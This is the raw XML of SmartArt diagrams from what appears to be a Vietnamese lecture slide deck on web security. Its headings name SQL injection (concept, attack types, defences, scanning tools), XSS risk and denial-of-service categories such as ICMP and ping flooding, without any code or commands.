              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>SQL Injection</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="636675" y="1158755"/>
        <a:ext cx="7125893" cy="173146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EE4A30-9CCE-4815-8485-5E055953A693}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="5400000">
          <a:off x="415439" y="1404319"/>
          <a:ext cx="1239867" cy="2063112"/>
        </a:xfrm>
        <a:prstGeom prst="corner">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16120"/>
            <a:gd name="adj2" fmla="val 16110"/>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13F1B29-2607-4C75-8994-AA653EF6A94B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="208474" y="2020745"/>
          <a:ext cx="1862589" cy="16326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rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2200" kern="1200"/>
            <a:t>Khái niệm</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="208474" y="2020745"/>
        <a:ext cx="1862589" cy="1632668"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1D436C71-0B33-4691-BE6C-76BB5D3AA3BF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1719631" y="1252430"/>
          <a:ext cx="351431" cy="351431"/>
        </a:xfrm>
        <a:prstGeom prst="triangle">
          <a:avLst>
            <a:gd name="adj" fmla="val 100000"/>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8A38C6B-B26C-4D98-81DE-A52B509FF70F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="5400000">
          <a:off x="2695612" y="840088"/>
          <a:ext cx="1239867" cy="2063112"/>
        </a:xfrm>
        <a:prstGeom prst="corner">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16120"/>
            <a:gd name="adj2" fmla="val 16110"/>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33E858F-C498-45F8-B957-4322301E8F16}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2488647" y="1456514"/>
          <a:ext cx="1862589" cy="16326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rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2200" kern="1200"/>
            <a:t>Các dạng tấn công SQL Injection</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2488647" y="1456514"/>
        <a:ext cx="1862589" cy="1632668"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{AB6E4892-296E-419F-B1CD-CAFE60847FC3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3999804" y="688199"/>
          <a:ext cx="351431" cy="351431"/>
        </a:xfrm>
        <a:prstGeom prst="triangle">
          <a:avLst>
            <a:gd name="adj" fmla="val 100000"/>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3221F77-E1DF-45C9-ACE5-B4735A822FFD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="5400000">
          <a:off x="4975785" y="275856"/>
          <a:ext cx="1239867" cy="2063112"/>
        </a:xfrm>
        <a:prstGeom prst="corner">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16120"/>
            <a:gd name="adj2" fmla="val 16110"/>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30CAFAF-EE92-4E60-998B-E4156AA5C7B4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="4768820" y="892283"/>
          <a:ext cx="1862589" cy="16326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rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2200" kern="1200"/>
            <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="4768820" y="892283"/>
        <a:ext cx="1862589" cy="1632668"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{34E767A6-DAE0-445C-B2D3-B28EABE1A0F6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6279977" y="123968"/>
          <a:ext cx="351431" cy="351431"/>
        </a:xfrm>
        <a:prstGeom prst="triangle">
          <a:avLst>
            <a:gd name="adj" fmla="val 100000"/>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405AA7C-5713-4D74-8F26-92568F109EA9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="5400000">
          <a:off x="7255958" y="-288374"/>
          <a:ext cx="1239867" cy="2063112"/>
        </a:xfrm>
        <a:prstGeom prst="corner">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16120"/>
            <a:gd name="adj2" fmla="val 16110"/>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1D70254-BEED-4521-9FA1-36AAD3C7D81A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="7048993" y="328051"/>
          <a:ext cx="1862589" cy="16326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rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2200" kern="1200"/>
            <a:t>Giới thiệu một số công cụ quét lỗ hổng SQL Injection</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="7048993" y="328051"/>
        <a:ext cx="1862589" cy="163266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CC5684-3C74-44E4-9C37-D23146F54300}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="5400000">
          <a:off x="3927929" y="-1314721"/>
          <a:ext cx="1367391" cy="4340352"/>
        </a:xfrm>
        <a:prstGeom prst="round2SameRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:alpha val="90000"/>
            <a:tint val="55000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent2">
              <a:alpha val="90000"/>
              <a:tint val="55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1111250" rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2500" kern="1200">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Đánh cắp dữ liệu từ Server</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr marL="228600" lvl="1" indent="-228600" algn="l" defTabSz="1111250" rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2500" kern="1200">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Thay đổi dữ liệu</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr marL="228600" lvl="1" indent="-228600" algn="l" defTabSz="1111250" rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2500" kern="1200">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Deface website</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="2441449" y="238510"/>
        <a:ext cx="4273601" cy="1233889"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{624CBC54-9F06-4847-9A24-39413A353611}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="2441448" cy="1709239"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:srgbClr val="C0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4310" tIns="97155" rIns="194310" bIns="97155" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="2266950" rtl="0">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="5100" kern="1200"/>
            <a:t>Mục đích</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="83438" y="83438"/>
        <a:ext cx="2274572" cy="154236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76A578-B55C-43EC-B2A0-551426FD04BF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2024487"/>
          <a:ext cx="10860157" cy="1638000"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:alpha val="90000"/>
            <a:tint val="4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E841021-028B-435A-A662-9D12B985022C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="543007" y="1065087"/>
          <a:ext cx="7313229" cy="1918800"/>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7342" tIns="0" rIns="287342" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>3. Nguy cơ tấn công XSS</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="636675" y="1158755"/>
        <a:ext cx="7125893" cy="173146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76A578-B55C-43EC-B2A0-551426FD04BF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2024487"/>
          <a:ext cx="10860157" cy="1638000"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:alpha val="90000"/>
            <a:tint val="4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E841021-028B-435A-A662-9D12B985022C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="543007" y="1065087"/>
          <a:ext cx="7313229" cy="1918800"/>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7342" tIns="0" rIns="287342" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>5. Nguy cơ tấn công </a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>từ chối dịch vụ</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="3500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="636675" y="1158755"/>
        <a:ext cx="7125893" cy="173146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9EAEE1-B141-8149-B598-A2FC9726C17B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1116" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
            </a:rPr>
            <a:t>Băng thông mạng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1116" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E1C9B790-AD02-DB4B-90E8-7BFEE9B60B8A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="937526"/>
          <a:ext cx="2321718" cy="613780"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Liên quan khả năng của liên kết mạng kết nối một máy chủ tới Internet</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="309308" y="955503"/>
        <a:ext cx="2285764" cy="577826"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{9C0BB106-18F0-064A-9F7C-7245A6EA83E6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="1645734"/>
          <a:ext cx="2321718" cy="613780"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="542120"/>
                <a:satOff val="20000"/>
                <a:lumOff val="-2941"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="542120"/>
                <a:satOff val="20000"/>
                <a:lumOff val="-2941"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="542120"/>
                <a:satOff val="20000"/>
                <a:lumOff val="-294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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Với hầu hết các tổ chức, đây là kết nối của họ tới ISP</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="309308" y="1663711"/>
        <a:ext cx="2285764" cy="577826"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{CC58C958-26F6-42BD-B11C-953A51DACB19}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="2353942"/>
          <a:ext cx="2321718" cy="613780"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="1084240"/>
                <a:satOff val="40000"/>
                <a:lumOff val="-5882"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1084240"/>
                <a:satOff val="40000"/>
                <a:lumOff val="-5882"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1084240"/>
                <a:satOff val="40000"/>
                <a:lumOff val="-5882"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Ví dụ: Ping flooding</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="309308" y="2371919"/>
        <a:ext cx="2285764" cy="577826"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{200D4077-F322-A54F-A959-16520676AF19}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3120925" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tài nguyên hệ thống</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3120925" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{331622DA-667B-3D42-86F2-0516235F2E15}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3411140" y="938175"/>
          <a:ext cx="2321718" cy="941989"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="1626359"/>
                <a:satOff val="60000"/>
                <a:lumOff val="-8824"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1626359"/>
                <a:satOff val="60000"/>
                <a:lumOff val="-8824"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1626359"/>
                <a:satOff val="60000"/>
                <a:lumOff val="-882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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Nhằm làm quá tải hoặc crash các phần mềm network handling</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3438730" y="965765"/>
        <a:ext cx="2266538" cy="886809"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{485F3DDF-2E91-40E1-9783-AA7B6A3AF28C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3411140" y="2025085"/>
          <a:ext cx="2321718" cy="941989"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="2168479"/>
                <a:satOff val="80000"/>
                <a:lumOff val="-11765"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2168479"/>
                <a:satOff val="80000"/>
                <a:lumOff val="-11765"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2168479"/>
                <a:satOff val="80000"/>
                <a:lumOff val="-1176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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Ví dụ: SYN Spoofing</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3438730" y="2052675"/>
        <a:ext cx="2266538" cy="886809"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6240735" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tài nguyên ứng dụng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6240735" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6530950" y="937260"/>
          <a:ext cx="2321718" cy="2030730"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Liên quan tới một số lượng yêu cầu hợp lệ, mỗi yêu cầu tiêu tốn lượng lớn tài nguyên, vì vậy giới hạn khả năng của máy chủ phản hồi yêu cầu từ người dùng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6590428" y="996738"/>
        <a:ext cx="2202762" cy="1911774"/>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9EAEE1-B141-8149-B598-A2FC9726C17B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1116" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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altLang="en-US" sz="2800" b="1" kern="1200"/>
            <a:t>ICMP Flood</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1116" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="938175"/>
          <a:ext cx="2321718" cy="941989"/>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a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>Sử dụng gói ICMP</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="318921" y="965765"/>
        <a:ext cx="2266538" cy="886809"/>
      </dsp:txXfrm>
    </dsp:sp>
